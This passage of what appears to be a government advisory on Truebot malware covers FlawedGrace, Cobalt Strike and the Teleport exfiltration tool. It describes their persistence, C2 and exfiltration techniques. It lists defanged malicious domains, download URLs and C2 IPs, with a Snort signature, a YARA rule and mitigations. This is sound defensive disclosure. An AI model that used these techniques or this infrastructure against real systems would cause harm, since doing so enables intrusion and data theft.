After deployment by Truebot, FlawedGrace is able to modify registry [T1112] and print spooler programs [T1547.012] that control the order that documents are loaded to a print queue. FlawedGrace manipulates these features to both escalate privilege and establish persistence.
During FlawedGrace’s execution phase, the RAT stores encrypted payloads [T1027.009] within the registry. The tool can create scheduled tasks and inject payloads into msiexec[.]exe and svchost[.]exe, which are command processes that enable FlawedGrace to establish a command and control (C2) connection to 92.118.36[.]199, for example, as well as load dynamic link libraries (DLLs) [T1055.001] to accomplish privilege escalation.
Several hours post initial access, Truebot has been observed injecting Cobalt Strike beacons into memory [T1055] in a dormant mode for the first few hours prior to initiating additional operations. Please see the Cobalt Strike section below for more information on how this remote access tool (RAT) is used in Truebot operations.
Discovery and Defense Evasion
During the first stage of Truebot’s execution process, it checks the current version of the operating system (OS) with RtlGetVersion and processor architecture using GetNativeSystemInfo [T1082].[4] Note: This variant of Truebot malware is designed with over one gigabyte (GB) of junk code which functions to hinder detection and analysis efforts [T1027.001].
Following the initial checks for system information, Truebot has the capability to enumerate all running processes [T1057], collect sensitive local host data [T1005], and send this data to an encoded data string described below for second-stage execution. Based on IOCs in table 1, Truebot also has the ability to discover software security protocols and system time metrics, which aids in defense evasion, as well as enables synchronization with the compromised system’s internal clock to facilitate scheduling tasks [T1518.001][T1124].
Next, it uses a .JSONIP extension, (e.g., IgtyXEQuCEvAM.JSONIP), to create a thirteen character globally unique identifier (GUID)—a 128-bit text string that Truebot uses to label and organize the data it collects [T1036].
After creating the GUID, Truebot compiles and enumerates running process data into either a base64 or unique hexadecimal encoded string [T1027.001]. Truebot’s main goal is identifying the presence of security debugger tools. However, the presence of identified debugger tools does not change Truebot’s execution process—the data is compiled into a base64 encoded string for tracking and defense evasion purposes [T1082][T1622].
Data Collection and Exfiltration
Following Truebot’s enumeration of running processes and tools, the affected system’s computer and domain name [T1082][T1016], along with the newly generated GUID, are sent to a hard-coded URL in a POST request (as observed in the user-agent string). Note: A user-agent string is a customized HTTP request that includes specific device information required for interaction with web content. In this instance, cyber threat actors can redirect victims to malicious domains and further establish a C2 connection.
The POST request functions as means for establishing a C2 connection for bi-lateral communication. With this established connection, Truebot uses a second obfuscated domain to receive additional payloads [T1105], self-replicate across the environment [T1570], and/or delete files used in its operations [T1070.004]. Truebot malware has the capability to download additional malicious modules [T1105], load shell code [T1620], and deploy various tools to stealthily navigate an infected network.
Associated Delivery Vectors and Tools
Truebot has been observed in association with the following delivery vectors and tools:
Raspberry Robin (Malware)
Raspberry Robin is a wormable malware with links to other malware families and various infection methods, including installation via USB drive [T1091].[5] Raspberry Robin has evolved into one of the largest malware distribution platforms and has been observed deploying Truebot, as well as other post-compromise payloads such as IcedID and Bumblebee malware.[6] With the recent shift in Truebot delivery methods from malicious emails to the exploitation of CVE-2022-31199, a large number of Raspberry Robin infections have leveraged this exploitable CVE.[2]
Flawed Grace (Malware)
FlawedGrace is a remote access tool (RAT) that can receive incoming commands [T1059] from a C2 server sent over a custom binary protocol [T1095] using port 443 to deploy additional tools [T1105].[7] Truebot malware has been observed leveraging (and dropping) FlawedGrace via phishing campaigns as an additional payload [T1566.002].[8] Note: FlawedGrace is typically deployed minutes after Truebot malware is executed.
Cobalt Strike (Tool)
Cobalt Strike is a popular remote access tool (RAT) that cyber threat actors have leveraged—in an observable manner—for a variety of post-exploitation means. Typically a few hours after Truebot’s execution phase, cyber threat actors have been observed deploying additional payloads containing Cobalt Strike beacons for persistence and data exfiltration purposes [T1059].[2] Cyber threat actors use Cobalt Strike to move laterally via remote service session hijacking [T1563.001][T1563.002], collecting valid credentials through LSASS memory credential dumping, or creating local admin accounts to achieve pass the hash alternate authentication [T1003.001][T1550.002].
Teleport (Tool)
Cyber threat actors have been observed using a custom data exfiltration tool, which Talos has named “Teleport.”[2] Teleport is known to evade detection during data exfiltration by using an encryption key hardcoded in the binary and a custom communication protocol [T1095] that encrypts data using advanced encryption standard (AES) and a hardcoded key [T1048][T1573.002]. Furthermore, to maintain its stealth, Teleport limits the data it collects and syncs with outbound organizational data/network traffic [T1029][T1030].
Truebot Malware Indicators of Compromise (IOCs)
Truebot IOCs from May 31, 2023, contain IOCs from cyber threat actors conducting Truebot malspam campaigns. Information is derived from a trusted third party, they observed cyber threat actors from 193.3.19[.]173 (Russia) using a compromised local account to conduct phishing campaigns on May 23, 2023 and spread malware through: https[:]//snowboardspecs[.]com/nae9v, which then promptly redirects the user to: https://www.meditimespharma[.]com/gfghthq/, which a trusted third party has linked to other trending Truebot activity.
After redirecting to https://www.meditimespharma[.]com/gfghthq/, trusted third parties have observed, the cyber threat actors using Truebot to pivot to https://corporacionhardsoft[.]com/images/2/Document_16654.exe, which is a domain associated with snowboardspecs[.]com. This malicious domain has been linked to UNC4509, a threat cluster that has been known to use traffic distribution systems (TDS) to redirect users to either a benign or malicious website to facilitate their malicious phishing campaigns in May 2023.
According to trusted third parties, the MD5 Hash: 6164e9d297d29aa8682971259da06848 is downloaded from https://corporacionhardsoft.com/images/2/Document_16654[.]exe, and has been flagged by numerous security vendors, as well as is linked to UNC4509 Truebot campaigns. Note: These IOCs are associated with Truebot campaigns used by Graceful Spider to deliver FlawedGrace and LummaStealer payloads in May of 2023.
After Truebot is downloaded, the malware copies itself to C:\Intel\RuntimeBroker.exe and—based on trusted third party analysis—links to https://essadonio.com/538332[.]php (which is linked to 45.182.189[.]71 (Panama) and is associated with other trending Truebot malware campaigns from May 2023).
Please reference table 1 for IOCs described in the paragraph above.



Table 1: Truebot IOCs from May of 2023
 
 




Indicator Type
Indicator
Source


Registrant
GKG[.]NET Domain Proxy Service Administrator
Trusted Third Party


Compromised Account Created:
2022-04-10
Trusted Third Party


Malicious account created
1999-11-09
Trusted Third Party


IP
193.3.19[.]173 (Russia)
Trusted Third Party


URL
https://snowboardspecs[.]com/nae9v
Trusted Third Party


Domain
https://corporacionhardsoft[.]com/images/2/Document_16654.exe
Trusted Third Party


File
Document_16654[.]exe
Trusted Third Party


MD5 Hash
6164e9d297d29aa8682971259da06848
Trusted Third Party


File
Document_may_24_16654[.]exe
Trusted Third Party


File
C:\Intel\RuntimeBroker[.]exe
Trusted Third Party


URL
https://essadonio.com/538332[.]php
Trusted Third Party


IP
45.182.189[.]71 (Panama)
Trusted Third Party


Account Created
2023-05-18
Trusted Third Party



 



Table 2: Truebot malware IOCs from May of 2023
 
 




Indicator Type
Indicator
Source


File Name
Secretsdump[.]py
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


Domain
Imsagentes[.]pe
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


URL
https://imsagentes[.]pe/dgrjfj/
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


URL
https://imsagentes[.]pe/dgrjfj
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


URL
https://hrcbishtek[.]com/{5
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


URL
https://ecorfan.org/base/sj/document_may_24_16654[.]exe
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


Domain
Hrcbishtek[.]com
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


MD5 Hash
F33734DFBBFF29F68BCDE052E523C287
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


MD5 Hash
F176BA63B4D68E576B5BA345BEC2C7B7
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


MD5 Hash
F14F2862EE2DF5D0F63A88B60C8EEE56
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


Domain
Essadonio[.]com
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


Domain
Ecorfan[.]org
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


SHA256 Hash
C92C158D7C37FEA795114FA6491FE5F145AD2F8C08776B18AE79DB811E8E36A3
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


File Name
Atexec[.]py
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


MD5 Hash
A0E9F5D64349FB13191BC781F81F42E1
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


IPv4
92.118.36[.]199
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


IPv4
81.19.135[.]30
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


MD5 Hash
72A589DA586844D7F0818CE684948EEA
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


SHA256 Hash
717BEEDCD2431785A0F59D194E47970E9544FBF398D462A305F6AD9A1B1100CB
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


IPv4
5.188.86[.]18
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


IPv4
5.188.206[.]78
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


IPv4
45.182.189[.]71
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


IPv4
139.60.160[.]166
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/


SHA256 Hash
121A1F64FFF22C4BFCEF3F11A23956ED403CDEB9BDB803F9C42763087BD6D94E
https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/



 



Table 3: Truebot IOCs from May 2023 (Malicious Domains, and Associated IP addresses and URLs)
 
 




Malicious Domain
Associated IP(s)
Beacon URL


nitutdra[.]com
46.161.40[.]128
 


romidonionhhgtt[.]com
46.161.40.128
 


midnigthwaall[.]com
46.161.40[.]128
 


dragonetzone[.]com
46.161.40[.]128
hxxps://dragonetzone[.]com/gate_info[.]php


rprotecruuio[.]com
45.182.189[.]71
 


essadonio[.]com
45.182.189[.]71
hxxps://nomoresense[.]com/checkinfo[.]php


nomoresense[.]com
45.182.189[.]91
hxxps://nomoresense[.]com/checkinfo[.]php


ronoliffuion[.]com
45.182.189[.]120
hxxps://ronoliffuion[.]com/dns[.]php


bluespiredice[.]com
45.182.189[.]119
 


dremmfyttrred[.]com
45.182.189[.]103
hxxps://dremmfyttrred[.]com/dns[.]php


ms-online-store[.]com
45.227.253[.]102
 


ber6vjyb[.]com
92.118.36[.]252
hxxps://ber6vjyb[.]com/dns[.]php


jirostrogud[.]com
88.214.27[.]101
hxxps://ber6vjyb[.]com/dns[.]php


fuanshizmo[.]com
45.182.189[.]229
 


qweastradoc[.]com
92.118.36[.]213
hxxp://nefosferta[.]com/gate[.]php


qweastradoc[.]com
92.118.36[.]213
hxxp://nefosferta[.]com/gate[.]php


qweastradoc[.]com
92.118.36[.]213
hxxp://nefosferta[.]com/gate[.]php


hiperfdhaus[.]com
88.214.27[.]100
hxxp://nefosferta[.]com/gate[.]php


guerdofest[.]com
45.182.189[.]228
hxxp://qweastradoc[.]com/gate[.]php


nefosferta[.]com
179.60.150[.]139
hxxp://nefosferta[.]com/gate[.]php



 



Table 4: Truebot IOCs from May 2023 Continued (Malicious Domains and Associated Hashes)
 
 
 




 Malicious Domain
MD5
SHA1
SHA256


nitutdra[.]com
 
 
 


romidonionhhgtt[.]com
 
 
 


midnigthwaall[.]com
 
 
 


dragonetzone[.]com
64b27d2a6a55768506a5658a31c045de
c69f080180430ebf15f984be14fb4c76471cd476
e0178ab0893a4f25c68ded11e74ad90403443e413413501d138e0b08a910471e


rprotecruuio[.]com
 
 
 


essadonio[.]com
9a3bad7d8516216695887acc9668cda1
a89c097138e5aab1f35b9a03900600057d907690
4862618fcf15ba4ad15df35a8dcb0bdb79647b455fea6c6937c7d050815494b0


essadonio[.]com
6164e9d297d29aa8682971259da06848
96b95edc1a917912a3181d5105fd5bfad1344de0
717beedcd2431785a0f59d194e47970e9544fbf398d462a305f6ad9a1b1100cb


nomoresense[.]com
8f924f3cbe5d8fe3ecb7293478901f1a
516051b4cab1be74d32a6c446eabac7fc354904f
6b646641c823414c2ee30ae8b91be3421e4f13fa98e2d99272956e61eecfc5a1


nomoresense[.]com
ac6a2f1eafaae9f6598390d1017dd76c
1c637c2ded5d3a13fd9b56c35acf4443f308be52
f9f649cb5de27f720d58aa44aec6d0419e3e89f453730e155067506ad3ece638


ronoliffuion[.]com
881485ac77859cf5aaa8e0d64fbafc5f
51be660a3bdaab6843676e9d3b2af8444e88bbda
36d89f0455c95f9b00a8cea843003d0b53c4e33431fe57b5e6ec14a6c2e00e99


bluespiredice[.]com
 
 
 


dremmfyttrred[.]com
e4a42cbda39a20134d6edcf9f03c44ed
afda13d5365b290f7cdea701d00d05b0c60916f8
47f962063b42de277cd8d22550ae47b1787a39aa6f537c5408a59b5b76ed0464


dremmfyttrred[.]com
aa949d1a7ebe5f878023c6cfb446e29b
06057d773ad04fda177f6b0f6698ddaa47f7168a
594ade1fb42e93e64afc96f13824b3dbd942a2cdbc877a7006c248a38425bbc1


dremmfyttrred[.]com
338476c2b0de4ee2f3e402f3495d0578
03916123864aa034f7ca3b9d45b2e39b5c91c502
a67df0a8b32bdc5f9d224db118b3153f66518737e702314873b673c914b2bb5c


ms-online-store[.]com
 
 
 


ber6vjyb[.]com
46fe07c07fd0f45ba45240ef9aae2a44
b918f97c7c6ebc9594de3c8f2d9d75ecc292d02b
c0f8aeeb2d11c6e751ee87c40ee609aceb1c1036706a5af0d3d78738b6cc4125


jirostrogud[.]com
89c8afc5bbd34f160d8a2b7218b9ca4a
16ecf30ff8c7887037a17a3eaffcb17145b69160
5cc8c9f2c9cee543ebac306951e30e63eff3ee103c62dadcd2ce43ef68bc7487


jirostrogud[.]com
5da364a8efab6370a174736705645a52
792623e143ddd49c36f6868e948febb0c9e19cd3
80b9c5ec798e7bbd71bbdfffab11653f36a7a30e51de3a72c5213eafe65965d9


fuanshizmo[.]com
 
 
 


qweastradoc[.]com
ee1ccb6a0e38bf95e44b73c3c46268c5
62f5a16d1ef20064dd78f5d934c84d474aca8bbe
0e3a14638456f4451fe8d76fdc04e591fba942c2f16da31857ca66293a58a4c3


qweastradoc[.]com
82d4025b84cf569ec82d21918d641540
bb32c940f9ca06e7e8533b1d315545c3294ee1a0
c042ad2947caf4449295a51f9d640d722b5a6ec6957523ebf68cddb87ef3545c


qweastradoc[.]com
dbecfe9d5421d319534e0bfa5a6ac162
9e7a2464f53ce74d840eb84077472bc29fd1ba05
c9b874d54c18e895face055eeb6faa2da7965a336d70303d0bd6047bec27a29d


qweastradoc[.]com
b7fed593e8eb3646f876367b56725e6c
44090a7858eceb28bc111e1edd2f0dc98047afb2
ff8c8c8bfba5f2ba2f8003255949678df209dbff95e16f2f3c338cfa0fd1b885


hiperfdhaus[.]com
8e2b823aac6c9e11fcabecb1d8c19adf
77ad34334a370d85ca5e77436ed99f18b185eee3
a30e1f87b78d1cd529fbe2afdd679c8241d3baab175b2f083740263911a85304


hiperfdhaus[.]com
8a94163ddf956abd0ea92d89db0034e5
abc96032071adeb6217f0a5ba1aff55dc11f5438
b95a764820e918f42b664f3c9a96141e2d7d7d228da0edf151617fabdd9166cf


guerdofest[.]com
65fb9572171b903aa31a325f550d8778
d8bd44b7a8f136e29b31226f4edf566a4223266c
d5bbcaa0c3eeea17f12a5cc3dbcaffff423d00562acb694561841bcfe984a3b7


nefosferta[.]com
d9d85bdb6a3ac60a8ba6776c661dbace
78e38e522b1765efb15d0585e13c1f1301e90788
092910024190a2521f21658be849c4ac9ae6fa4d5f2ecd44c9055cc353a26875


nefosferta[.]com
20643549f19bed9a6853810262622755
c8227dcc1cd6ecc684de8c5ea9b16e3b35f613f1
1ef8cdbd3773bd82e5be25d4ba61e5e59371c6331726842107c0f1eb7d4d1f49


nefosferta[.]com
e9299fc9b7daa0742c28bfc4b03b7b25
77360abc473dc65c8bdd73b6459b9ea8fddb6f1d
22e3f4602a258e92a0b8deb5a2bd69c67f4ac3ca67362a745178848a9da7a3cc


nefosferta[.]com
775fb391db27e299af08933917a3acda
eaaa5e68956a3a3f6113e965199f479e10ae9956
2d50b03a92445ba53ae147d0b97c494858c86a56fe037c44bc0edabb902420f7


nefosferta[.]com
f4045710c99d347fe6dfa2c0fcadde29
b7bffdbbaf817d149bbd061070a2d171449afbfc
32ae88cddeeeec255d6d9c827f6bffc7a95e9ea7b83a84a79ff793735a4b4ed7


nefosferta[.]com
587acecdb9491e0897d1067eb02e7c8d
a9eb1ac4b85d17da3a2bae5835c7e862d481c189
55d1480cd023b74f10692c689b56e7fd6cc8139fb6322762181daead55a62b9e


nefosferta[.]com
0bae65245e5423147fce079de29b6136
f24232330e6f428bfbb6b9d8154db1c4046c2fc2
6210a9f5a5e1dc27e68ecd61c092d2667609e318a95b5dade3c28f5634a89727


nefosferta[.]com
5022a85b39a75ebe2bc0411d7b058b2e
a9040ac0e9f482454e040e2a7d874ddc50e6f6ce
68a86858b4638b43d63e8e2aaec15a9ebd8fc14d460dd74463db42e59c4c6f89


nefosferta[.]com
6a2f114a8995dbeb91f766ac2390086e
edac3cf9533b6f7102f6324fadb437a0814cc680
72813522a065e106ac10aa96e835c47aa9f34e981db20fa46a8f36c4543bb85d


nefosferta[.]com
e9115cc3280c16f9019e0054e059f4b8
dad01b0c745649c6c8b87dbeb7ab549ed039515d
7a64bc69b60e3cd3fd00d4424b411394465640f499e56563447fe70579ccdd00


nefosferta[.]com
b54cc9a3dd88e478ea601dfd5b36805e
318fdfec4575d1530a41c80274aa8caae7b7f631
7c607eca4005ba6415e09135ef38033bb0b0e0ff3e46d60253fc420af7519347


nefosferta[.]com
f129c12b1bda7426f6b31682b42ee4b0
5bb804153029c97fe23517ae5428a591c3c63f28
7c79ec3f5c1a280ffdf19d0000b4bfe458a3b9380c152c1e130a89de3fe04b63


nefosferta[.]com
f68aa4c92dd30bd5418f136aaf6c07d6
aa56f43e39d114235a6b1d5f66b593cc80325fa4
7e39dcd15307e7de862b9b42bf556f2836bf7916faab0604a052c82c19e306ca


nefosferta[.]com
acac995cee8a6a75fa79eb41bdffa53f
971a00a392b99f64a3886f40b6ef991e62f0fe2f
97bae3587f1d2fd35f24eb214b9dd6eed95744bed62468d998c7ef55ff8726d4


nefosferta[.]com
36057710279d9f0d023cb5613aa76d5e
e4dd1f8fc4e44c8fd0e25242d994c4b59eed6939
97d0844ce9928e32b11706e06bf2c4426204d998cb39964dd3c3de6c5223fff0


nefosferta[.]com
37e6904d84153d1435407f4669135134
1dcd85f7364ea06cd595a86e3e9be48995d596e9
bf3c7f0ba324c96c9a9bff6cf21650a4b78edbc0076c68a9a125ebcba0e523c9


nefosferta[.]com
4f3916e7714f2a32402c9d0b328a2c91
87a692e3592f7b997c7d962919e243b665f2be36
c3743a8c944f5c9b17528418bf49b153b978946838f56e5fca0a3f6914bee887


nefosferta[.]com
d9daaa0df32b0bb01a09e500fc7f5881
f9cb839adba612db5884e1378474996b4436c0cd
c3b3640ddf53b26f4ebd4eedf929540edb452c413ca54d0d21cc405c7263f490


nefosferta[.]com
c87fb9b9f6c343670bed605420583418
f05cf0b026b2716927dac8bcd26a2719ea328964
c6c4f690f0d15b96034b4258bdfaf797432a3ec4f73fbc920384d27903143cb0


nefosferta[.]com
2be64efd0fa7739123b26e4b70e53c5c
318fdfec4575d1530a41c80274aa8caae7b7f631
ed38c454575879c2546e5fccace0b16a701c403dfe3c3833730d23b32e41f2fe



 



Table 5: Truebot IOCs Connected to Russia, and Panama Locations
 
 
 




 Malicious Domain
IP Addresses
Files
SHA256


Dremmfyttrred[.]com
 
 
 


 
45.182.189[.]103
 
 


 
94.142.138[.]61
 
 


 
172.64.155[.]188
 
 


 
104.18.32[.]68
 
 


 
 
Update[.]exe
 


 
 
Document_26_apr_2443807[.]exe
 


 
 
3ujwy2rz7v[.]exe
 


 
 
 
fe746402c74ac329231ae1b5dffa8229b509f4c15a0f5085617f14f0c1579040


droogggdhfhf[.]com
 
3LXJyA6Gf[.]exe
7d75244449fb5c25d8f196a43a6eb9e453652b2185392376e7d44c21bd8431e7



 
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 6-16 for all referenced cyber threat actor tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.



Table 6: Initial Access
 
 




Technique Title
ID
Use


Replication Through Removable Media
T1091
Cyber threat actors use removable media drives to deploy Raspberry Robin malware.


Drive-by Compromise
T1189
Cyber threat actors embed malicious links or attachments within web domains to gain initial access.


Exploit Public-Facing Application
T1190
Cyber threat actors are exploiting Netwrix vulnerability CVE-2022-31199 for initial access with follow-on capabilities of lateral movement through remote code execution.


Phishing
T1566.002
Truebot actors can send spear phishing links to gain initial access.



 



Table 7: Execution
 
 




Technique Title
ID
Use


Command and Scripting Interpreter
T1059

Cyber threat actors have been observed dropping cobalt strike beacons as a reverse shell proxy to create persistence within the compromised network.
Cyber threat actors use FlawedGrace to receive PowerShell commands over a C2 channel to deploy additional tools.



Shared Modules
T1129
Cyber threat actors can deploy malicious payloads through obfuscated share modules.


User Execution: Malicious Link
T1204.001
Cyber threat actors trick users into clicking a link by making them believe they need to perform a Google Chrome software update.



 



Table 8: Persistence
 
 




Technique Title
ID
Use


Hijack Execution Flow: DLL Side-Loading
1574.002
Cyber threat actors use Raspberry Robin, among other toolsets to side-load DLLs to maintain persistence.



 



Table 9: Privilege Escalation
 
 




Technique Title
ID
Use


Boot or Logon Autostart Execution: Print Processors
T1547.012
FlawedGrace malware manipulates print spooler functions to achieve privilege escalation.



 



Table 10: Defense Evasion
 
 




Technique Title
ID
Use


Obfuscated Files or Information
T1027
Truebot uses a .JSONIP extension (e.g., IgtyXEQuCEvAM.JSONIP), to create a GUID.


Obfuscated Files or Information: Binary Padding
T1027.001
Cyber threat actors embed around one gigabyte of junk code within the malware string to evade detection protocols.


Masquerading: Masquerade File Type
T1036.008
Cyber threat actors hide Truebot malware as legitimate appearing file formats.


Process Injection
T1055
Truebot malware has the ability to load shell code after establishing a C2 connection.


Indicator Removal: File Deletion
T1070.004

Truebot malware implements self-deletion TTPs throughout its attack cycle to evade detection.
Teleport exfiltration tool deletes itself after it has completed exfiltrating data to the C2 station.



Modify Registry
T1112
FlawedGrace is able to modify registry programs that control the order that documents are loaded to a print que.


Reflective Code Loading
T1620

Truebot malware has the capability to load shell code and deploy various tools to stealthily navigate an infected network.
 




 



Table 11: Credential Access
 
 




Technique Title
ID
Use


OS Credential Dumping: LSASS Memory
T1003.001
Cyber threat actors use cobalt strike to gain valid credentials through LSASS memory dumping.



 



Table 12: Discovery
 
 




Technique Title
ID
Use


System Network Configuration Discovery
T1016
Truebot malware scans and enumerates the affected system’s domain names.


Process Discovery
T1057
Truebot malware enumerates all running processes on the local host.


System Information Discovery
T1082

Truebot malware scans and enumerates the OS version information, and processor architecture.
Truebot malware enumerates the affected system’s computer names.



System Time Discovery
T1124
Truebot has the ability to discover system time metrics, which aids in enables synchronization with the compromised system’s internal clock to facilitate scheduling tasks.


Software Discovery: Security Software Discovery
T1518.001
Truebot has the ability to discover software security protocols, which aids in defense evasion.


Debugger Evasion
T1622
Truebot malware scans the compromised environment for debugger tools and enumerates them in effort to evade network defenses.



 



Table 13: Lateral Movement
 
 




Technique Title
ID
Use


Exploitation of Remote Services
T1210
Cyber threat actors exploit CVE-2022-31199 Netwrix Auditor vulnerability and use its capabilities to move laterally within a compromised network.


Use Alternate Authentication Material: Pass the Hash
T1550.002
Cyber threat actors use cobalt strike to authenticate valid accounts


Remote Service Session Hijacking
T1563.001
Cyber threat actors use cobalt strike to hijack remote sessions using SSH and RDP hijacking methods.


Remote Service Session Hijacking: RDP Hijacking
T1563.002
Cyber threat actors use cobalt strike to hijack remote sessions using SSH and RDP hijacking methods.


Lateral Tool Transfer
T1570
Cyber threat actors deploy additional payloads to transfer toolsets and move laterally.



 



Table 14: Collection
 
 




Technique Title
ID
Use


Data from Local System
T1005

Truebot malware checks the current version of the OS and the processor architecture and compiles the information it receives.
Truebot gathers and compiles compromised system’s host and domain names.



Screen Capture
T1113
Truebot malware takes snapshots of local host data, specifically processor architecture data, and sends that to a phase 2 encoded data string.



 



Table 15: Command and Control
 
 




Technique Title
ID
Use


Application Layer Protocol
T1071
Cyber threat actors use teleport exfiltration tool to blend exfiltrated data with network traffic.


Non-Application Protocol
T1095
Cyber threat actors use Teleport and FlawedGrace to send data over custom communication protocol.


Ingress Transfer Tool
T1105
Cyber threat actors deploy various ingress transfer tool payloads to move laterally and establish C2 connections.


Encrypted Channel: Asymmetric Cryptography
T1573.002
Cyber threat actors use Teleport to create an encrypted channel using AES.



 



Table 16: Exfiltration
 
 




Technique Title
ID
Use


Scheduled Transfer
T1029
Teleport limits the data it collects and syncs with outbound organizational data/network traffic.


Data Transfer Size Limits
T1030
Teleport limits the data it collects and syncs with outbound organizational data/network traffic.


Exfiltration Over C2 Channel
T1048

Cyber threat actors blend exfiltrated data with network traffic to evade detection.
Cyber threat actors use the Teleport tool to exfiltrate data over a C2 protocol.




 
DETECTION METHODS
CISA and authoring organizations recommend that organizations review and implement the following detection signatures, along with: Win/malicious_confidence100% (W), Trojan:Win32/Tnega!MSR, and Trojan.Agent.Truebot.Gen, as well as YARA rules below to help detect Truebot malware.
Detection Signatures

Figure 2: Snort Signature to Detect Truebot Malware


alert tcp any any -> any any (msg:”TRUEBOT: Client HTTP Header”; sid:x; rev:1; flow:established,to_server; content:”Mozilla/112.0 (compatible|3b 20 4d 53 49 45 20 31 31 2e 30 3b 20 57 69 6e 64 6f 77 73 20 4e 54 20 31 30 2e 30 30 29|”; http_header; nocase; classtype:http-header; metadata:service http;)



 
YARA Rules
CISA developed the following YARA to aid in detecting the presence of Truebot Malware.

Figure 3: YARA Rule for Detecting Truebot Malware



rule CISA_10445155_01 : TRUEBOT downloader
{
meta:
Author = ""CISA Code & Media Analysis""
Incident = ""10445155""
Date = ""2023-05-17""
Last_Modified = ""20230523_1500""
Actor = ""n/a""
Family = ""TRUEBOT""
Capabilities = ""n/a""
Malware_Type = ""downloader""
Tool_Type = ""n/a""
Description = ""Detects TRUEBOT downloader samples""
SHA256 = ""7d75244449fb5c25d8f196a43a6eb9e453652b2185392376e7d44c21bd8431e7""
strings:
$s1 = { 64 72 65 6d 6d 66 79 74 74 72 72 65 64 2e 63 6f 6d }
$s2 = { 4e 73 75 32 4f 64 69 77 6f 64 4f 73 32 }
$s3 = { 59 69 50 75 6d 79 62 6f 73 61 57 69 57 65 78 79 }
$s4 = { 72 65 70 6f 74 73 5f 65 72 72 6f 72 2e 74 78 74 }
$s5 = { 4c 6b 6a 64 73 6c 66 6a 33 32 6f 69 6a 72 66 65 77 67 77 2e 6d 70 34 }
$s6 = { 54 00 72 00 69 00 67 00 67 00 65 00 72 00 31 00 32 }
$s7 = { 54 00 55 00 72 00 66 00 57 00 65 00 73 00 54 00 69 00 66 00 73 00 66 }
condition:
5 of them
}





Additional YARA rules for detecting Truebot malware can be referenced from GitHub.[9]

INCIDENT RESPONSE
The following steps are recommended if organizations detect a Truebot malware infection and compromise:

Quarantine or take offline potentially affected hosts.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.
Provision new account credentials.
Reimage compromised host.
Report the compromise to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870) or contact your local FBI field office. State, local, tribal, or territorial government entities can also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722).

MITIGATIONS
CISA and the authoring organizations recommend organizations implement the below mitigations, including mandating phishing-resistant multifactor authentication (MFA) for all staff and services.
For additional best practices, see CISA’s Cross-Sector Cybersecurity Performance Goals (CPGs). The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of IT and OT security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common TTPs. Because the CPGs are a subset of best practices, CISA and co-sealers recommend software manufacturers implement a comprehensive information security program based on a recognized framework, such as the NIST Cybersecurity Framework (CSF).

Apply patches to CVE-2022-31199
Update Netwrix Auditor to version 10.5

Netwrix recommends using their Auditor application only on internally facing networks. System owners that don't follow this recommendation, and use the application in externally facing instances, are at increased risk to having CVE-2022-31199 exploited on their systems.
Reduce threat of malicious actors using remote access tools by:

Implementing application controls to manage and control execution of software, including allowlisting remote access programs.

Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.



See the National Security Agency’s Cybersecurity Information sheet, Enforce Signed Software Execution Policies, and additional guidance below:

Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions [CPG 2.N].
Restrict the use of PowerShell by using Group Policy, and only grant to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell [CPG 2.E].
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities [CPG 1.E, 2.S, 2.T].
Enable enhanced PowerShell logging [CPG 2.T, 2.U].

PowerShell logs contain valuable data, including historical OS and registry interaction and possible IOCs of a cyber threat actor’s PowerShell use.
Ensure PowerShell instances, using the latest version, have module, script block, and transcription logging enabled (enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. The authoring organizations recommend turning on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.


Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.
